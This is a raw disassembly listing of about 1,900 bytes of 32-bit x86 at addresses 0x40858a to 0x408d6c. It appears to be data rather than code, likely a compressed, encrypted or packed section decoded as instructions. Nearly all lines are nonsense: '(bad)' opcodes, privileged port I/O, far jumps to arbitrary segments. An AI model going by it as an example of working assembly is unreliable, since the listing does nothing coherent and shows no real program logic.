  40858a:	(bad)  
  40858b:	lods   al,BYTE PTR ds:[esi]
  40858c:	or     BYTE PTR [eax+0x36],al
  40858f:	cli    
  408590:	adc    ecx,DWORD PTR ds:0xb11b6a50
  408596:	xor    DWORD PTR [eax-0x46],ebp
  408599:	pop    ss
  40859a:	inc    ebp
  40859b:	push   ecx
  40859c:	xor    BYTE PTR [esi+0x3d],0xaf
  4085a0:	or     BYTE PTR [edx+0x65],dh
  4085a3:	cmp    eax,0x8790468f
  4085a8:	jne    0x408580
  4085aa:	pop    ss
  4085ab:	nop
  4085ac:	lock mov ebx,0xd290c16f
  4085b2:	scas   al,BYTE PTR es:[edi]
  4085b3:	push   cs
  4085b4:	sbb    BYTE PTR [eax],0xd
  4085b7:	pusha  
  4085b8:	fnstcw WORD PTR [eax+0x59]
  4085bb:	pop    esp
  4085bc:	rcl    BYTE PTR [esi+0x61f9d074],0xcb
  4085c3:	movups xmm2,xmm1
  4085c6:	add    DWORD PTR [ebp+0x3b23c5af],0x53
  4085cd:	icebp  
  4085ce:	xchg   ebp,eax
  4085cf:	or     ebx,ecx
  4085d1:	(bad)  
  4085d2:	mov    ebx,0xb0d646e3
  4085d7:	pop    esp
  4085d8:	sbb    bh,0xcc
  4085db:	mov    gs,WORD PTR [edi+esi*1+0x136753c2]
  4085e2:	stc    
  4085e3:	jle    0x4085a7
  4085e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085e6:	mov    ebx,0xa5f31c7d
  4085eb:	jb     0x4085ac
  4085ed:	push   esi
  4085ee:	xchg   ecx,eax
  4085ef:	out    dx,al
  4085f0:	loop   0x4085d7
  4085f2:	pushf  
  4085f3:	aam    0xcd
  4085f5:	mov    ebp,DWORD PTR ds:0x7603b929
  4085fb:	xor    al,0xaa
  4085fd:	sbb    DWORD PTR [edi+0x2454b22d],ebx
  408603:	lahf   
  408604:	les    esp,FWORD PTR [edi-0x78030fff]
  40860a:	bound  ebx,QWORD PTR [esi+edi*1+0x19]
  40860e:	(bad)  
  40860f:	or     ebx,DWORD PTR [edx+0xd2e0a77]
  408615:	aam    0x18
  408617:	fild   WORD PTR [ecx+0x74]
  40861a:	and    BYTE PTR ds:0xf086e1a,dl
  408620:	jp     0x40860a
  408622:	sub    eax,0xe122ccdd
  408627:	mov    DWORD PTR [eax-0x61],eax
  40862a:	or     DWORD PTR [edx-0x33e6e280],0x7b99faee
  408634:	xlat   BYTE PTR ds:[ebx]
  408635:	inc    eax
  408636:	xor    al,0xeb
  408638:	test   DWORD PTR [eax],esi
  40863a:	jmp    0x84d4015f
  40863f:	addr16 into 
  408641:	or     BYTE PTR [edx+0x37b48c8d],bl
  408647:	imul   ecx,DWORD PTR [ebp-0x1e],0x76
  40864b:	loopne 0x4085f7
  40864d:	sbb    ebp,edx
  40864f:	xor    DWORD PTR [edi-0x636f5f3c],0x5dd934b9
  408659:	jb     0x4086d6
  40865b:	xchg   ebp,eax
  40865c:	mov    ds:0xbb60b98,al
  408661:	sbb    DWORD PTR [edi+0x5f],edx
  408664:	pop    ebp
  408665:	xchg   edx,eax
  408666:	leave  
  408667:	xchg   esp,eax
  408668:	or     BYTE PTR [esi+0x6bd4adbf],0x9d
  40866f:	scas   al,BYTE PTR es:[edi]
  408670:	sub    BYTE PTR [edx],ah
  408672:	je     0x40869c
  408674:	popa   
  408675:	dec    eax
  408676:	xchg   edx,eax
  408677:	lods   eax,DWORD PTR ds:[esi]
  408678:	aam    0x76
  40867a:	sub    al,0xde
  40867c:	test   eax,0xd40a9420
  408681:	lods   al,BYTE PTR ds:[esi]
  408683:	int3   
  408684:	cmc    
  408685:	cmp    ecx,DWORD PTR [eax+0x787eb6e9]
  40868b:	pushf  
  40868c:	pop    eax
  40868d:	jmp    FWORD PTR [edi-0x183287f0]
  408693:	and    ebp,DWORD PTR [edi+ebp*8]
  408696:	rcr    cl,cl
  408698:	sub    eax,esp
  40869a:	daa    
  40869b:	mov    ebx,0x69404c3a
  4086a0:	inc    ebp
  4086a1:	data16 jo 0x4086de
  4086a4:	arpl   WORD PTR [ebx+ecx*8+0x5583ece],cx
  4086ab:	mov    ebp,DWORD PTR [ecx+0x5d]
  4086ae:	sub    ecx,DWORD PTR [esi+0x769c6e7b]
  4086b4:	sbb    eax,0x952a4a0c
  4086b9:	mov    ebp,0x2d452583
  4086be:	or     BYTE PTR [edi],cl
  4086c0:	ss push 0xffffffc2
  4086c3:	push   ebp
  4086c4:	dec    esi
  4086c5:	inc    esi
  4086c6:	sbb    BYTE PTR [ebp+0x665c6187],bh
  4086cc:	addr16 dec esp
  4086ce:	dec    edx
  4086cf:	(bad)  
  4086d0:	pop    ebx
  4086d1:	jge    0x40871e
  4086d3:	sbb    BYTE PTR [ebx-0x6f],bh
  4086d6:	jmp    0xc1f:0x55c8e4be
  4086dd:	jae    0x4086e8
  4086df:	pop    es
  4086e0:	push   eax
  4086e1:	inc    ecx
  4086e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086e3:	mov    esi,0x92fe6369
  4086e8:	adc    BYTE PTR [ebp-0x61175d13],al
  4086ee:	cs xchg esp,eax
  4086f0:	loop   0x40872b
  4086f2:	test   DWORD PTR [esi-0x117319a4],esp
  4086f8:	les    esp,FWORD PTR gs:[ecx]
  4086fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086fc:	inc    esp
  4086fd:	bound  edx,QWORD PTR [bp-0x10e1]
  408702:	cmp    cx,WORD PTR [esp+eax*1]
  408706:	xor    eax,0xe246943a
  40870b:	ins    BYTE PTR es:[edi],dx
  40870c:	pop    esp
  40870d:	cmc    
  40870e:	imul   ecx,DWORD PTR [edi-0xe84ea59],0x667c6b95
  408718:	mov    esp,0xa2cde432
  40871d:	sbb    dh,0x2a
  408720:	sbb    BYTE PTR [edx+0x46088d49],cl
  408726:	aas    
  408727:	pop    ebp
  408728:	call   0xaf9:0x8e25419b
  40872f:	xchg   al,bl
  408731:	repnz sub edi,ecx
  408734:	rcl    BYTE PTR [eax-0x3f],cl
  408737:	push   ebx
  408738:	dec    ecx
  408739:	and    dl,BYTE PTR gs:[esi+0x17a6eb6d]
  408740:	mov    ds:0x8e1fe6c,al
  408745:	mov    edi,0xb49d823f
  40874a:	mov    bh,0x9
  40874c:	outs   dx,DWORD PTR ds:[esi]
  40874d:	mov    ds:0x3b15922d,al
  408752:	jl     0x4086ed
  408754:	push   es
  408755:	xlat   BYTE PTR ds:[ebx]
  408756:	add    ah,bl
  408758:	retf   
  408759:	cli    
  40875a:	(bad)  
  40875b:	push   ebx
  40875c:	out    dx,eax
  40875d:	sahf   
  40875e:	ins    BYTE PTR es:[edi],dx
  40875f:	pop    esi
  408760:	push   esi
  408761:	mov    eax,0x7c6bac88
  408766:	dec    eax
  408767:	int3   
  408768:	in     al,dx
  408769:	ret    
  40876a:	lods   al,BYTE PTR ds:[esi]
  40876b:	xlat   BYTE PTR ds:[ebx]
  40876c:	mov    eax,esi
  40876e:	int    0xa0
  408770:	test   DWORD PTR [edx],0xf13606df
  408776:	sbb    esi,DWORD PTR [edi+ecx*4+0x3c3071d3]
  40877d:	push   cs
  40877e:	mov    cl,0x7a
  408780:	push   eax
  408781:	jno    0x408781
  408783:	cmp    esi,DWORD PTR [edx]
  408785:	in     al,0xfd
  408787:	mov    al,ds:0x76785073
  40878c:	ret    0x2728
  40878f:	jne    0x7b01e607
  408795:	add    DWORD PTR [edi-0x3a],eax
  408798:	inc    ebp
  408799:	mov    ebx,0x2fa205c3
  40879e:	cdq    
  40879f:	xchg   edx,eax
  4087a0:	cmp    DWORD PTR [eax+0x22],0xffffffb2
  4087a4:	pop    eax
  4087a5:	in     eax,0x2
  4087a7:	es mov esi,0xd7e1a7a9
  4087ad:	in     eax,0x21
  4087af:	shl    dh,0x61
  4087b2:	pop    ebx
  4087b3:	daa    
  4087b4:	iret   
  4087b5:	das    
  4087b6:	sti    
  4087b7:	inc    esi
  4087b8:	jmp    0x3b71:0x5b44d92b
  4087bf:	cwde   
  4087c0:	xchg   esi,eax
  4087c1:	fcom   QWORD PTR [edx]
  4087c3:	dec    eax
  4087c4:	mov    esp,0x77faa5d2
  4087c9:	pushf  
  4087ca:	dec    ebx
  4087cb:	aas    
  4087cc:	adc    edi,DWORD PTR ds:0x5d37d8ca
  4087d2:	jns    0x408851
  4087d4:	pop    ss
  4087d5:	pusha  
  4087d6:	(bad)  
  4087d7:	dec    sp
  4087d9:	in     eax,dx
  4087da:	adc    DWORD PTR [ecx+0x19],esi
  4087dd:	out    0xc2,al
  4087df:	mov    ds:0x31ca66c8,al
  4087e4:	adc    al,0x1c
  4087e6:	jge    0x408863
  4087e8:	pop    edi
  4087e9:	not    BYTE PTR [eax-0xb4b8af9]
  4087ef:	pop    es
  4087f0:	sbb    eax,0xa3eb8f97
  4087f5:	fst    DWORD PTR [edi+0x33]
  4087f8:	push   esi
  4087f9:	xchg   ebx,eax
  4087fa:	or     eax,0xfb9b4a2
  4087ff:	stos   DWORD PTR es:[edi],eax
  408800:	cmp    al,0x6f
  408802:	mov    bh,bh
  408804:	push   cs
  408805:	retf   0x583f
  408808:	push   ecx
  408809:	jnp    0x408829
  40880b:	pop    eax
  40880c:	push   ss
  40880d:	xchg   edi,eax
  40880e:	xchg   ebp,eax
  40880f:	outs   dx,DWORD PTR ds:[esi]
  408810:	in     al,dx
  408811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408812:	jp     0x40886d
  408814:	jb     0x4087b2
  408816:	pop    edx
  408817:	or     al,0xee
  408819:	cmp    BYTE PTR [edi],ah
  40881b:	jmp    0xdbdbe739
  408820:	fwait
  408821:	imul   esp,DWORD PTR [ebp-0x42],0x52adda96
  408828:	pxor   mm2,mm0
  40882b:	loope  0x4087cc
  40882d:	(bad)  
  40882e:	mov    ah,0xf9
  408830:	dec    edi
  408831:	add    eax,0x2b448bad
  408836:	sar    ch,cl
  408838:	addr16 cmp cl,ch
  40883b:	sub    ebx,DWORD PTR [edx]
  40883d:	test   ah,dh
  40883f:	call   0x7b5a:0xfe0583a2
  408846:	lahf   
  408847:	jbe    0x408842
  408849:	clc    
  40884a:	cmp    esp,edx
  40884c:	inc    ecx
  40884d:	sbb    al,0x2f
  40884f:	jl     0x40880d
  408851:	jnp    0x4087d8
  408853:	jecxz  0x40885d
  408855:	fdivr  QWORD PTR [edi+edi*8+0x7e]
  408859:	sbb    esi,edx
  40885b:	scas   al,BYTE PTR es:[edi]
  40885c:	in     eax,0xd9
  40885e:	mov    ds:0x6b5cfac2,eax
  408863:	jle    0x40887c
  408865:	jno    0x408810
  408867:	and    edx,DWORD PTR [edi]
  408869:	in     al,dx
  40886a:	ds inc ebp
  40886c:	pop    edi
  40886d:	xchg   edi,eax
  40886e:	or     bl,0xa6
  408871:	and    al,0xa1
  408873:	inc    ebp
  408874:	push   ebx
  408875:	(bad)  ds:0x5f2742f7
  40887b:	cs push ds
  40887d:	jae    0x4088bd
  40887f:	push   esp
  408880:	dec    ebx
  408881:	iret   
  408882:	add    al,0x96
  408884:	push   edx
  408885:	push   es
  408886:	mov    BYTE PTR [edx+0x5b],ch
  408889:	imul   ebp,ebp,0x973cb9ae
  40888f:	iret   
  408890:	call   0x249b:0x86a5f344
  408897:	ss push ebx
  408899:	cdq    
  40889a:	shl    esi,0x22
  40889d:	pop    ebx
  40889e:	xor    ebx,eax
  4088a0:	mov    dl,0x1d
  4088a2:	scas   eax,DWORD PTR es:[edi]
  4088a3:	xchg   esi,eax
  4088a4:	mov    DWORD PTR [ecx-0x20ee0c2b],eax
  4088aa:	out    dx,al
  4088ab:	or     al,0x8e
  4088ad:	sub    al,0x7
  4088af:	sbb    bl,ch
  4088b1:	jb     0x40883d
  4088b3:	xchg   esi,ecx
  4088b5:	fsub   st,st(4)
  4088b7:	stos   BYTE PTR es:[edi],al
  4088b8:	cmp    eax,0x56d4116
  4088bd:	and    DWORD PTR [eax+0x25],esi
  4088c0:	and    DWORD PTR [edx],edx
  4088c2:	not    BYTE PTR [ecx+edi*4]
  4088c5:	xor    ecx,eax
  4088c7:	in     al,dx
  4088c8:	pop    ebx
  4088c9:	mov    bl,0xa4
  4088cb:	mov    bl,0x94
  4088cd:	jne    0x4088fe
  4088cf:	inc    ecx
  4088d0:	mov    ebx,DWORD PTR [ebp+0x31b8d525]
  4088d6:	ds cli 
  4088d8:	cdq    
  4088d9:	push   edx
  4088da:	pop    ecx
  4088db:	aam    0x79
  4088dd:	out    dx,eax
  4088de:	xor    eax,0xb471c078
  4088e3:	push   cs
  4088e4:	xor    DWORD PTR [esp+ebx*4+0x53f88617],ecx
  4088eb:	jb     0x40886e
  4088ed:	js     0x4088c1
  4088ef:	jmp    0x422d:0x410e493e
  4088f6:	xor    esp,esi
  4088f8:	ss jg  0x40887e
  4088fb:	sub    al,0xcb
  4088fd:	and    DWORD PTR [ebp-0x78],ebp
  408900:	jb     0x40897d
  408902:	pop    es
  408903:	or     eax,0xf3b6b0a4
  408908:	mov    WORD PTR [edx+ecx*1+0x8],ds
  40890c:	shl    DWORD PTR [ebp+0x21],0x52
  408910:	cld    
  408911:	je     0x40898a
  408913:	aas    
  408914:	jmp    0xbab497c6
  408919:	pop    ds
  40891a:	dec    edx
  40891b:	xor    ebx,DWORD PTR [edi-0x216b3e13]
  408921:	pusha  
  408922:	and    bh,dh
  408924:	jnp    0x408958
  408926:	jmp    0x7664d998
  40892b:	icebp  
  40892c:	mov    edx,0xaef0142b
  408931:	mov    esp,0x40c2981
  408936:	inc    esp
  408937:	mov    ebp,0x49237676
  40893c:	jae    0x4088d3
  40893e:	dec    esp
  40893f:	stos   BYTE PTR es:[edi],al
  408940:	(bad)  
  408941:	pop    esp
  408942:	dec    ecx
  408943:	cmp    DWORD PTR [esp+ebp*2+0x7f],edi
  408947:	mov    esp,0x6cd790f2
  40894c:	cmc    
  40894d:	cwde   
  40894e:	mov    eax,0x744653d8
  408953:	xchg   DWORD PTR [edi-0x10],edi
  408956:	xchg   DWORD PTR [edx-0x3],ebx
  408959:	mov    ds,ebp
  40895b:	pop    ebp
  40895c:	cmp    DWORD PTR [eax],esp
  40895e:	mov    al,0xbe
  408960:	call   0x4b8f:0x2948dc7f
  408967:	sti    
  408968:	in     al,0xc0
  40896a:	and    al,0x5b
  40896c:	jmp    0x67bfc5d3
  408971:	test   eax,0x9da90c79
  408976:	in     al,dx
  408977:	out    0xe5,al
  408979:	ins    BYTE PTR es:[edi],dx
  40897a:	adc    esi,DWORD PTR [eax+ebx*2]
  40897d:	test   eax,0xa25efcae
  408982:	adc    bh,0x90
  408985:	inc    ecx
  408986:	jp     0x408954
  408988:	cmp    dl,cl
  40898a:	push   0xffffff82
  40898c:	lods   al,BYTE PTR ds:[esi]
  40898d:	jmp    0x4089c7
  40898f:	and    DWORD PTR [edx-0x2515ec75],0xd9284c59
  408999:	pop    edi
  40899a:	into   
  40899b:	adc    DWORD PTR [ebp-0x5c5d227e],edi
  4089a1:	mov    bh,0x5f
  4089a3:	leave  
  4089a4:	dec    DWORD PTR [esi]
  4089a6:	lods   al,BYTE PTR ds:[esi]
  4089a7:	inc    edx
  4089a8:	ds push es
  4089aa:	sbb    al,0x3a
  4089ac:	push   ebx
  4089ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089ae:	dec    ebx
  4089af:	daa    
  4089b0:	ja     0x40896c
  4089b2:	sahf   
  4089b3:	mov    edi,0x11f563c0
  4089b8:	jae    0x4089b0
  4089ba:	fiadd  DWORD PTR [edx-0x2]
  4089bd:	mov    al,ds:0xa5374e53
  4089c2:	pusha  
  4089c3:	add    eax,0x5d9e22fe
  4089c8:	mov    dl,0x3a
  4089ca:	stos   BYTE PTR es:[edi],al
  4089cb:	scas   al,BYTE PTR es:[edi]
  4089cc:	adc    BYTE PTR [edx+0x76],0x2
  4089d0:	xchg   DWORD PTR [esi-0x54],ebp
  4089d3:	pop    ebx
  4089d4:	adc    DWORD PTR [edi+ebx*1],ecx
  4089d7:	fmul   DWORD PTR ds:0xc0105ee9
  4089dd:	shl    DWORD PTR ds:0x94fec00b,0x2c
  4089e4:	mov    ecx,0x8544d753
  4089e9:	adc    BYTE PTR [edi+0x6fd93f59],bh
  4089ef:	out    dx,al
  4089f0:	out    dx,eax
  4089f1:	push   cs
  4089f2:	xchg   ecx,eax
  4089f3:	and    BYTE PTR [eax-0x3248a003],ah
  4089f9:	dec    edx
  4089fa:	lea    esi,[edx]
  4089fc:	xchg   ebx,eax
  4089fd:	jb     0x4089ca
  4089ff:	jg     0x40898f
  408a01:	(bad)  
  408a02:	je     0x408a2c
  408a04:	div    dl
  408a06:	jp     0x408a5a
  408a08:	mov    ds:0xc892bea6,eax
  408a0d:	adc    eax,0x5580504c
  408a12:	fdiv   QWORD PTR [eax-0x10]
  408a15:	sbb    eax,0x1d128e14
  408a1a:	mov    edi,0x6530427b
  408a1f:	dec    ebx
  408a20:	add    al,0x36
  408a22:	pop    edi
  408a23:	and    cl,dl
  408a25:	xchg   edi,eax
  408a26:	sahf   
  408a27:	mov    ?,WORD PTR [esi]
  408a29:	loope  0x4089fa
  408a2b:	cmp    eax,0xeb02f133
  408a30:	repz jmp 0xfaf571e7
  408a36:	adc    esp,eax
  408a38:	shr    DWORD PTR [esi-0x22b7a1e],cl
  408a3e:	adc    al,0x95
  408a40:	cmp    eax,ebx
  408a42:	xlat   BYTE PTR ds:[ebx]
  408a43:	mov    esi,0x6a6c0e07
  408a48:	sub    eax,0x4e6bfd69
  408a4d:	pop    edi
  408a4e:	cmp    BYTE PTR [eax+edx*4+0x7aa6d56b],ch
  408a55:	xlat   BYTE PTR ds:[ebx]
  408a57:	lea    esp,[edi-0x75]
  408a5a:	scas   eax,DWORD PTR es:[edi]
  408a5b:	xor    al,0x4b
  408a5d:	xchg   esi,eax
  408a5e:	xlat   BYTE PTR ds:[ebx]
  408a5f:	mov    ebp,edx
  408a61:	aad    0xf6
  408a63:	shr    BYTE PTR [ebp+0x2ba3ec41],0xea
  408a6a:	xlat   BYTE PTR ds:[ebx]
  408a6b:	pop    ebp
  408a6c:	add    DWORD PTR [edi+0x764a4ffc],esi
  408a72:	jp     0x408a8c
  408a74:	mov    ecx,0x8a115f57
  408a79:	cmp    edi,DWORD PTR [ebx]
  408a7b:	pop    ebp
  408a7c:	in     eax,0xdd
  408a7e:	xor    DWORD PTR [ebp+0x33b1936],edi
  408a84:	rol    al,0xbc
  408a87:	dec    esp
  408a88:	push   edx
  408a89:	test   DWORD PTR [edi-0x4f],edx
  408a8c:	and    BYTE PTR [edx-0x4b95a1bb],bh
  408a92:	push   ecx
  408a93:	icebp  
  408a94:	adc    BYTE PTR [ebx+0x40dca107],0x57
  408a9b:	mov    ebx,0x8c986a1d
  408aa0:	xchg   ch,bl
  408aa2:	stos   DWORD PTR es:[edi],eax
  408aa3:	and    ebx,DWORD PTR [edi+0x5c]
  408aa6:	in     al,dx
  408aa7:	fnstcw WORD PTR [eax]
  408aa9:	cli    
  408aaa:	inc    edi
  408aab:	jl     0x408b0b
  408aad:	jo     0x408afe
  408aaf:	sbb    ebp,DWORD PTR [edx]
  408ab1:	ror    esi,cl
  408ab3:	mov    ds:0xc6fb0f21,eax
  408ab8:	jge    0x408b04
  408aba:	ja     0x408b3a
  408abc:	lods   eax,DWORD PTR ds:[esi]
  408abd:	popa   
  408abe:	adc    eax,0xa336c152
  408ac3:	push   ss
  408ac4:	xor    eax,0xfa90b646
  408ac9:	pop    edi
  408aca:	sti    
  408acb:	mov    ds:0x44fac6ca,eax
  408ad0:	setl   BYTE PTR [eax]
  408ad3:	retf   0xc32d
  408ad6:	(bad)  
  408ad8:	aas    
  408ad9:	popf   
  408ada:	inc    esp
  408adb:	mov    dl,0x71
  408add:	not    DWORD PTR [ecx-0xad36cfa]
  408ae3:	jp     0x408b0e
  408ae5:	repnz cs adc al,0xca
  408ae9:	sbb    eax,0x3701a822
  408aee:	and    bl,dl
  408af0:	dec    edi
  408af1:	sbb    esp,DWORD PTR ds:0x477c6fcd
  408af7:	cmp    ah,BYTE PTR ds:0xffebff55
  408afd:	push   eax
  408afe:	out    0xcc,eax
  408b00:	xchg   eax,edi
  408b02:	push   ebp
  408b03:	xor    BYTE PTR [eax-0x13a83a56],ch
  408b09:	mov    fs,WORD PTR [edi-0x223d9a69]
  408b0f:	mov    ds:0x87e5e049,eax
  408b14:	mov    ah,0xed
  408b16:	pop    esp
  408b17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b19:	sub    BYTE PTR [eax],0xb0
  408b1c:	mov    ch,0x83
  408b1e:	je     0x408aa8
  408b20:	les    esp,FWORD PTR [edx+0x39e0eb52]
  408b26:	xchg   esp,eax
  408b27:	add    edx,esp
  408b29:	mov    eax,ds:0x30d04e4f
  408b2e:	xor    edi,DWORD PTR [ecx-0x38]
  408b31:	stos   DWORD PTR es:[edi],eax
  408b32:	popf   
  408b33:	mov    ecx,0xa42d95b2
  408b38:	and    eax,0xe55f8f44
  408b3d:	cmc    
  408b3e:	cwde   
  408b3f:	cld    
  408b40:	push   ecx
  408b41:	(bad)  
  408b42:	pop    edx
  408b43:	jae    0x408b99
  408b45:	shl    cl,1
  408b47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b48:	rcl    dh,cl
  408b4a:	add    cl,cl
  408b4c:	mov    ah,0x9f
  408b4e:	dec    esi
  408b4f:	dec    eax
  408b50:	inc    ebx
  408b51:	cmp    edx,DWORD PTR [edi+edi*2]
  408b54:	add    BYTE PTR [ecx-0x2ce8a21d],bh
  408b5a:	dec    esi
  408b5b:	std    
  408b5c:	adc    DWORD PTR [edx+0x1e],0xffffff84
  408b60:	data16 fsubr QWORD PTR [edi]
  408b63:	(bad)  
  408b64:	out    0xa3,al
  408b66:	inc    eax
  408b67:	dec    edi
  408b68:	pop    ebp
  408b69:	retf   
  408b6a:	sti    
  408b6b:	js     0x408b16
  408b6d:	mov    cl,0x59
  408b6f:	arpl   WORD PTR [edx],sp
  408b71:	dec    esp
  408b72:	add    al,0x80
  408b74:	cs ss xchg ecx,eax
  408b77:	dec    ecx
  408b78:	aaa    
  408b79:	ret    0x12fa
  408b7c:	jno    0x408b3d
  408b7e:	fs xchg esi,eax
  408b80:	mov    esi,0x413f03c6
  408b85:	cdq    
  408b86:	fninit 
  408b88:	mov    esi,0x81f97b3a
  408b8d:	in     eax,0x86
  408b8f:	daa    
  408b90:	sbb    ch,BYTE PTR [ecx]
  408b92:	push   0x31
  408b94:	sahf   
  408b95:	push   ebp
  408b96:	sbb    eax,DWORD PTR [ebp+0x58]
  408b99:	xor    esi,edi
  408b9b:	inc    esi
  408b9c:	or     eax,0x8467a09
  408ba1:	mov    eax,0x63f38d6b
  408ba6:	jbe    0x408b42
  408ba8:	stc    
  408ba9:	(bad)  
  408baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bab:	add    bh,dh
  408bad:	mov    bl,0x3d
  408baf:	xor    edi,ebx
  408bb1:	add    BYTE PTR [esi],dh
  408bb3:	jge    0x408b67
  408bb5:	mov    al,ds:0xe5ee1cb0
  408bba:	loope  0x408c29
  408bbc:	ret    
  408bbd:	aaa    
  408bbe:	adc    DWORD PTR [eax-0x4b8a5f3f],esi
  408bc4:	fist   WORD PTR [ecx+0x40]
  408bc7:	or     ch,BYTE PTR [edx]
  408bc9:	jb     0x408b4f
  408bcb:	outs   dx,BYTE PTR ds:[esi]
  408bcc:	fs pop es
  408bce:	cmp    al,0x25
  408bd0:	dec    ecx
  408bd1:	jne    0x408c00
  408bd3:	inc    ecx
  408bd4:	stos   BYTE PTR es:[edi],al
  408bd5:	inc    eax
  408bd6:	mov    dl,0x13
  408bd8:	sbb    ecx,edx
  408bda:	adc    DWORD PTR [esi-0x36],edi
  408bdd:	pop    ebp
  408bde:	daa    
  408bdf:	aam    0xa8
  408be1:	sahf   
  408be2:	sbb    al,0x9e
  408be4:	jb     0x408bdb
  408be6:	jae    0x408c59
  408be8:	dec    esi
  408be9:	sti    
  408bea:	test   eax,0xe6d69349
  408bef:	and    dl,BYTE PTR [edi+eiz*1-0x4b]
  408bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bf4:	fstp   QWORD PTR ds:0xad3f3c4c
  408bfa:	xor    DWORD PTR [edx+0x26],esp
  408bfd:	add    eax,0xd1b20662
  408c02:	scas   eax,DWORD PTR es:[edi]
  408c03:	jb     0x408c43
  408c05:	and    eax,0x1d543ec4
  408c0a:	jnp    0x408c32
  408c0c:	fcomp  DWORD PTR [edi-0x8]
  408c0f:	adc    esi,edi
  408c11:	(bad)  [edi]
  408c13:	mov    ds:0x287626a2,eax
  408c18:	mov    ds:0xf9e4df41,eax
  408c1d:	lock adc edi,DWORD PTR [edi-0x18]
  408c21:	cli    
  408c22:	repnz fstp QWORD PTR [edx+0x472a6cec]
  408c29:	add    ebx,DWORD PTR ds:0x7d5d14d
  408c2f:	pop    eax
  408c30:	mov    eax,ds:0x64e30dbd
  408c35:	repz jle 0x408ca5
  408c38:	popa   
  408c39:	jl     0x408bc7
  408c3b:	sbb    ah,BYTE PTR [ecx-0x4ee0f618]
  408c41:	repz add al,0x7
  408c44:	neg    BYTE PTR [eax+0x42]
  408c47:	push   ecx
  408c48:	into   
  408c49:	pop    esp
  408c4a:	outs   dx,BYTE PTR ds:[esi]
  408c4b:	xor    DWORD PTR [edi+0x3251ea94],edi
  408c51:	jp     0x408cc9
  408c53:	add    al,0x17
  408c55:	test   DWORD PTR [eax+0x23cdf480],0x31ea2e38
  408c5f:	cmp    eax,0xe209d7de
  408c64:	shr    BYTE PTR [ecx],0x77
  408c67:	lahf   
  408c68:	jne    0x408c80
  408c6a:	and    BYTE PTR [esi],dh
  408c6c:	mov    ebp,0xbab5658d
  408c71:	jmp    0x837aed01
  408c76:	sbb    al,0x96
  408c78:	and    eax,0x9f15106c
  408c7d:	and    dl,BYTE PTR [edx+ebp*4]
  408c80:	jns    0x408cfe
  408c82:	mov    edx,DWORD PTR [edi+0x6]
  408c85:	addr16 inc ebx
  408c87:	or     bl,BYTE PTR [ecx]
  408c89:	pop    ds
  408c8a:	xchg   cl,bh
  408c8c:	inc    eax
  408c8d:	mov    eax,ds:0x7b47bce5
  408c92:	xchg   ecx,eax
  408c93:	das    
  408c94:	pusha  
  408c95:	sub    eax,0x3482fb7a
  408c9a:	(bad)  [eax+0x58943de8]
  408ca0:	sbb    DWORD PTR [eax-0x30],esp
  408ca3:	out    dx,al
  408ca4:	or     BYTE PTR [esi+0x6d84404d],ch
  408caa:	sti    
  408cab:	(bad)  
  408cac:	rcr    edx,cl
  408cae:	mov    edi,0xba09357a
  408cb3:	push   ebp
  408cb4:	add    eax,0x2c48e976
  408cba:	pushf  
  408cbb:	stos   DWORD PTR es:[edi],eax
  408cbc:	pop    edi
  408cbd:	inc    edi
  408cbe:	push   eax
  408cbf:	cmp    ecx,ebp
  408cc1:	push   ebp
  408cc2:	jo     0x408cbf
  408cc4:	stc    
  408cc5:	cdq    
  408cc6:	enter  0xac10,0xf0
  408cca:	sub    DWORD PTR [eax+0x49],esi
  408ccd:	jge    0x408ccf
  408ccf:	xchg   ecx,eax
  408cd0:	adc    edx,eax
  408cd2:	or     DWORD PTR [ecx+edx*2-0x40dd32aa],edi
  408cd9:	xchg   edx,eax
  408cda:	retf   0x65a2
  408cdd:	mov    eax,ds:0x469fc691
  408ce2:	push   ds
  408ce3:	jb     0x408d2b
  408ce5:	lds    edi,FWORD PTR [ebp-0x20]
  408ce8:	aaa    
  408ce9:	adc    al,0x19
  408ceb:	xor    ch,bh
  408ced:	fst    DWORD PTR [ebx]
  408cef:	mov    edx,0x727f7f5a
  408cf4:	cli    
  408cf5:	cmp    cl,BYTE PTR [eax+edx*1-0x3108c020]
  408cfc:	add    BYTE PTR [ebx-0x1d87c943],ah
  408d02:	ins    BYTE PTR es:[edi],dx
  408d03:	and    al,0x28
  408d05:	pop    es
  408d06:	mov    al,0xaf
  408d08:	cmp    DWORD PTR [eax],eax
  408d0a:	loope  0x408d01
  408d0c:	outs   dx,DWORD PTR ds:[esi]
  408d0d:	pop    eax
  408d0e:	or     cl,BYTE PTR [ebp-0x4a]
  408d11:	jmp    0x86e4:0x7764c6b1
  408d18:	in     al,dx
  408d19:	push   esp
  408d1a:	(bad)  
  408d1b:	pusha  
  408d1c:	cwde   
  408d1d:	xor    dl,BYTE PTR [esi]
  408d1f:	stos   DWORD PTR es:[edi],eax
  408d20:	and    al,0xc1
  408d22:	xor    DWORD PTR [eax+eiz*4+0x1f9474c5],esp
  408d29:	rcl    DWORD PTR [edi-0x367afb92],0x74
  408d30:	lods   eax,DWORD PTR ds:[esi]
  408d31:	inc    eax
  408d32:	fidivr WORD PTR [edi+0x34]
  408d35:	push   ss
  408d36:	es stos BYTE PTR es:[edi],al
  408d38:	out    0x6c,eax
  408d3a:	les    eax,FWORD PTR [ecx]
  408d3c:	out    0x62,eax
  408d3e:	shl    BYTE PTR [ebp+0x45],0xdc
  408d42:	daa    
  408d43:	test   esi,esp
  408d45:	retf   0xf49f
  408d48:	popa   
  408d49:	call   0x70ff0a41
  408d4e:	ret    
  408d4f:	ss dec ebp
  408d51:	jne    0x408d1c
  408d53:	mov    ah,BYTE PTR [edx-0x3b]
  408d56:	inc    esi
  408d58:	cdq    
  408d59:	xor    ecx,DWORD PTR [edx]
  408d5b:	mov    al,0x4
  408d5d:	sbb    BYTE PTR [edi-0x7f2c09cb],dh
  408d63:	test   BYTE PTR [ecx+0x24484e15],0x1d
  408d6a:	jno    0x408cfa
  408d6c:	clc    
